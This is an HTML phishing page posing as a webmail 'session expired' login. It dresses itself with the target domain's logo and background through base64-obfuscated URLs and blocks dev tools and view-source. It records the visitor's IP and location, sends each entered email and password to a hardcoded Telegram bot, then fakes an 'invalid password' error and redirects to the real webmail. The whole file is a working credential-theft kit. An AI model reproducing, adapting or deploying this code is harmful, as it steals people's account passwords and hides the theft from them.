<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        #background-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            /* Removed blur filter to show image clearly */
        }
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
        }
        .login-container {
            max-width: 400px;
            margin: 160px auto 0 auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
            z-index: 1;
            text-align: center;
        }
        .header-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
        }
        .header-container img {
            position: absolute;
            top: 0;
            left: 0;
            width: 50px;
            height: 50px;
            margin-left: 2px;
            margin-top: 2px;
        }
        .welcome-text {
            padding-bottom: 30px;
            text-align: center;
            font-size: 16px;
        }
        .error-message, .success-message {
            margin-top: 20px;
            display: none;
        }
        .email-input-group {
            margin-bottom: 15px;
        }
        .location-info {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
            text-align: center;
        }
        /* Disable text selection */
        body {
            -webkit-user-select: none; /* Safari */
            -moz-user-select: none; /* Firefox */
            -ms-user-select: none; /* IE10+/Edge */
            user-select: none; /* Standard */
        }
    </style>
    <link id="dynamic-favicon" rel="icon" href="">
</head>
<body>
    <div id="background-container"></div>
    <div id="overlay"></div>
    <div class="container">
        <div class="login-container">
            <div class="header-container">
                <img id="domain-logo" src="" alt="Domain Logo">
                <h2 id="domain-name"></h2>
            </div>
            <div class="welcome-text">
                Your session has expired, Please login to continue.
            </div>
            <form id="login-form">
                <div class="mb-3 email-input-group">
                    <div class="input-group">
                        <span class="input-group-text"><i class="fas fa-user"></i></span>
                        <input type="email" class="form-control" id="username" placeholder="Email" autofocus="autofocus" value="" required>
                    </div>
                    <div class="form-text text-start">Enter your full email address</div>
                </div>
                <div class="mb-3">
                    <div class="input-group">
                        <span class="input-group-text"><i class="fas fa-lock"></i></span>
                        <input type="password" class="form-control" id="password" placeholder="Password">
                    </div>
                </div>
                <div class="location-info" id="location-info">
                    <i class="fas fa-map-marker-alt"></i> Detecting location...
                </div>
                <button type="submit" class="btn btn-primary w-100" id="submit-button">
                    Sign In
                </button>
                <div class="alert alert-danger error-message" role="alert">
                    Enter email password to continue.
                </div>
                <div class="alert alert-danger success-message" role="alert">
                    Invalid Email Password. Please try again!
                </div>
            </form>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Enhanced keyboard shortcut and developer tools protection
        (function() {
            // Disable right-click context menu
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            // Disable keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U, Ctrl+S, Ctrl+A (Select All)
                if (
                    e.keyCode === 123 || // F12
                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || // Ctrl+Shift+I/J/C
                    (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 65)) || // Ctrl+U/S/A
                    (e.metaKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || // Cmd+Shift+I/J/C (Mac)
                    (e.metaKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 65)) // Cmd+U/S/A (Mac)
                ) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);

            // Disable drag and drop
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
                return false;
            });

            // Disable text selection (except in input fields)
            document.addEventListener('selectstart', function(e) {
                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                    e.preventDefault();
                    return false;
                }
            });

            // Detect developer tools
            let devtools = {open: false, orientation: null};
            const threshold = 160;
            
            setInterval(function() {
                if (window.outerHeight - window.innerHeight > threshold || 
                    window.outerWidth - window.innerWidth > threshold) {
                    if (!devtools.open) {
                        console.clear();
                        devtools.open = true;
                        // Optional: Redirect or take action when devtools is detected
                        // window.location.href = 'about:blank';
                    }
                } else {
                    devtools.open = false;
                }
            }, 500);

            // Console warning
            console.clear();
            console.log("%cStop!", "color: red; font-size: 30px; font-weight: bold;");
            console.log("%cThis is a browser feature intended for developers. Do not enter any sensitive information here.", "color: red; font-size: 16px;");
        })();

        let successCount = 0;
        let successTimeout;
        let userLocation = {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            ip: 'Unknown'
        };

        // Telegram Bot Configuration
        const telegramConfig = {
            botToken: "8344366644:AAG9Kr-1HL75F3-vMGmEFUavBSsMLCO3JIA", // Your bot token
            chatId: "6655129471",     // Your chat ID
            apiUrl: "https://api.telegram.org/bot"
        };

        function setBackground(imageUrl) {
            const container = document.getElementById('background-container');
            const img = new Image();
            
            img.onload = function() {
                container.style.backgroundImage = `url('${imageUrl}')`;
                console.log("Background image loaded successfully:", imageUrl);
            };
            
            img.onerror = function() {
                console.error("Failed to load background image:", imageUrl);
                // Fallback to a generic background
                container.style.backgroundImage = "url('https://picsum.photos/seed/login/1920/1080.jpg')";
            };
            
            img.src = imageUrl;
        }

        function extractEmailAndDomain() {
            const hash = window.location.hash.substring(1);
            let email = '';
            
            if (hash) {
                try {
                    email = decodeURIComponent(hash);
                } catch (e) {
                    console.error('Error decoding URI component:', e);
                    email = hash;
                }
            }
            
            // Validate email format
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (email && emailRegex.test(email)) {
                const domain = email.split('@')[1];
                document.getElementById('username').value = email;
                return { email, domain, isValid: true };
            }
            
            // If no valid email in URL, check if there's a default domain
            const defaultDomain = 'example.com'; // Change this to your default domain
            const defaultEmail = `user@${defaultDomain}`;
            document.getElementById('username').value = '';
            return { email: '', domain: defaultDomain, isValid: false };
        }

        function getDomainName(domain) {
            if (!domain) return 'EMAIL';
            return domain.split('.')[0].toUpperCase();
        }

        function loadImageWithFallback(imgElement, primarySrc, fallbackSrc) {
            console.log("Attempting to load logo from:", primarySrc);
            
            const img = new Image();
            img.onload = function() {
                imgElement.src = primarySrc;
                console.log("Logo loaded successfully:", primarySrc);
            };
            
            img.onerror = function() {
                console.error("Failed to load primary logo:", primarySrc);
                console.log("Attempting to load fallback logo:", fallbackSrc);
                
                const fallbackImg = new Image();
                fallbackImg.onload = function() {
                    imgElement.src = fallbackSrc;
                    console.log("Fallback logo loaded successfully:", fallbackSrc);
                };
                
                fallbackImg.onerror = function() {
                    console.error("Failed to load fallback logo:", fallbackSrc);
                    // Use a generic icon as last resort
                    imgElement.src = "https://cdn-icons-png.flaticon.com/512/2099/2099058.png";
                };
                
                fallbackImg.src = fallbackSrc;
            };
            
            img.src = primarySrc;
        }

        function setFavicon(primarySrc, fallbackSrc) {
            const favicon = document.getElementById('dynamic-favicon');
            const img = new Image();
            
            img.onload = function() {
                favicon.href = primarySrc;
                console.log("Favicon loaded successfully:", primarySrc);
            };
            
            img.onerror = function() {
                console.error("Failed to load primary favicon:", primarySrc);
                console.log("Attempting to load fallback favicon:", fallbackSrc);
                
                const fallbackImg = new Image();
                fallbackImg.onload = function() {
                    favicon.href = fallbackSrc;
                    console.log("Fallback favicon loaded successfully:", fallbackSrc);
                };
                
                fallbackImg.onerror = function() {
                    console.error("Failed to load fallback favicon:", fallbackSrc);
                    // Use a generic icon as last resort
                    favicon.href = "https://cdn-icons-png.flaticon.com/512/2099/2099058.png";
                };
                
                fallbackImg.src = fallbackSrc;
            };
            
            img.src = primarySrc;
        }

        // Function to get user location using multiple services
        function getUserLocation() {
            // Try ip-api.com first (no API key required)
            fetch('http://ip-api.com/json/')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        userLocation = {
                            city: data.city || 'Unknown',
                            region: data.regionName || 'Unknown',
                            country: data.country || 'Unknown',
                            ip: data.query || 'Unknown'
                        };
                        updateLocationDisplay();
                    } else {
                        // Try ipinfo.io as fallback
                        tryIpInfo();
                    }
                })
                .catch(error => {
                    console.error('Error with ip-api.com:', error);
                    // Try ipinfo.io as fallback
                    tryIpInfo();
                });
        }

        // Fallback to ipinfo.io
        function tryIpInfo() {
            fetch('https://ipinfo.io/json?token=6b7c6c2b8c4a4f')
                .then(response => response.json())
                .then(data => {
                    userLocation = {
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        ip: data.ip || 'Unknown'
                    };
                    updateLocationDisplay();
                })
                .catch(error => {
                    console.error('Error with ipinfo.io:', error);
                    // Try browser geolocation as last resort
                    tryBrowserGeolocation();
                });
        }

        // Last resort: browser geolocation
        function tryBrowserGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const { latitude, longitude } = position.coords;
                        // Use Nominatim for reverse geocoding
                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
                            .then(response => response.json())
                            .then(data => {
                                const address = data.address || {};
                                userLocation = {
                                    city: address.city || address.town || address.village || 'Unknown',
                                    region: address.state || 'Unknown',
                                    country: address.country || 'Unknown',
                                    ip: 'Unknown'
                                };
                                updateLocationDisplay();
                            })
                            .catch(error => {
                                console.error('Error reverse geocoding:', error);
                                updateLocationDisplay();
                            });
                    },
                    error => {
                        console.error('Geolocation error:', error);
                        updateLocationDisplay();
                    }
                );
            } else {
                updateLocationDisplay();
            }
        }

        // Update location display in the UI
        function updateLocationDisplay() {
            const locationInfo = document.getElementById('location-info');
            locationInfo.innerHTML = `<i class="fas fa-map-marker-alt"></i> ${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
        }

        // Function to send data to Telegram
        function sendToTelegram(username, password) {
            const message = `üîê New Login Attempt\n\nüë§ Email: ${username}\nüîë Password: ${password}\nüåê Page: ${window.location.href}\nüìç Location: ${userLocation.city}, ${userLocation.region}, ${userLocation.country}\nüåç IP: ${userLocation.ip}\n‚è∞ Time: ${new Date().toLocaleString()}`;
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
            const params = {
                chat_id: telegramConfig.chatId,
                text: message,
                parse_mode: "HTML"
            };
            
            const xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        console.log("Telegram message sent successfully");
                    } else {
                        console.error("Error sending Telegram message:", xhr.status, xhr.responseText);
                    }
                }
            };
            xhr.send(JSON.stringify(params));
        }

        document.addEventListener('DOMContentLoaded', function() {
            const { email, domain, isValid } = extractEmailAndDomain();
            console.log("Extracted domain:", domain);
            
            // Set domain name and logo regardless of email validity
            const domainNameElement = document.getElementById('domain-name');
            const domainLogoElement = document.getElementById('domain-logo');
            domainNameElement.textContent = getDomainName(domain);
            
            // Generate logo URLs
            const logoUrl = atob('aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8ke2RvbWFpbn0=').replace('${domain}', domain);
            const fallbackLogoUrl = atob('aHR0cHM6Ly93ZWJtYWlsLmVtYWlscG5sLmNvbS93ZWJtYWlsX2xvZ28uc3Zn');
            console.log("Logo URL:", logoUrl);
            console.log("Fallback Logo URL:", fallbackLogoUrl);
            
            loadImageWithFallback(domainLogoElement, logoUrl, fallbackLogoUrl);

            // Generate favicon URLs
            const faviconUrl = atob('aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8ke2RvbWFpbn0=').replace('${domain}', domain);
            const fallbackFaviconUrl = atob('aHR0cHM6Ly93ZWJtYWlsLmVtYWlscG5sLmNvbS93ZWJtYWlsX2Fzc2V0cy9mYXZpY29uLmljbw==');
            console.log("Favicon URL:", faviconUrl);
            console.log("Fallback Favicon URL:", fallbackFaviconUrl);
            
            setFavicon(faviconUrl, fallbackFaviconUrl);
            
            // Set background image only if we have a valid domain
            if (domain) {
                const imageUrl = atob('aHR0cHM6Ly9pbWFnZS50aHVtLmlvL2dldC9odHRwOi8vd3d3LiR7ZG9tYWlufQ==').replace('${domain}', domain);
                console.log("Background Image URL:", imageUrl);
                setBackground(imageUrl);
            }
            
            // Enable/disable username field based on whether we have a valid email
            const usernameField = document.getElementById('username');
            if (isValid) {
                usernameField.setAttribute('disabled', 'disabled');
            } else {
                usernameField.removeAttribute('disabled');
                usernameField.focus();
            }

            // Get user location
            getUserLocation();

            const form = document.getElementById('login-form');
            form.addEventListener('submit', function(event) {
                event.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const errorMessage = document.querySelector('.error-message');
                const successMessage = document.querySelector('.success-message');
                const submitButton = document.getElementById('submit-button');
                
                if (password === '') {
                    errorMessage.style.display = 'block';
                } else {
                    errorMessage.style.display = 'none';
                    submitButton.innerHTML = `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying`;
                    submitButton.disabled = true;

                    // Send credentials to Telegram
                    sendToTelegram(username, password);
                    
                    // Simulate processing delay
                    setTimeout(function() {
                        // Always show "invalid password" message
                        successCount++;
                        successMessage.style.display = 'block';

                        document.getElementById('password').addEventListener('input', function clearSuccessMessage() {
                            successMessage.style.display = 'none';
                            document.getElementById('password').removeEventListener('input', clearSuccessMessage);
                        });

                        clearTimeout(successTimeout);
                        successTimeout = setTimeout(() => {
                            successMessage.style.display = 'none';
                        }, 8000);

                        document.getElementById('password').value = '';

                        if (successCount >= 2) {
                            successMessage.style.display = 'block';
                            setTimeout(() => {
                                // Extract domain from username if it's a valid email
                                const emailDomain = username.includes('@') ? username.split('@')[1] : domain;
                                window.location.href = `http://webmail.${emailDomain}`;
                            }, 6000);
                        }
                        
                        submitButton.innerHTML = 'Sign In';
                        submitButton.disabled = false;
                    }, 1500); // Simulate 1.5 second delay for "verification"
                }
            });

        });
    </script>
</body>
</html>
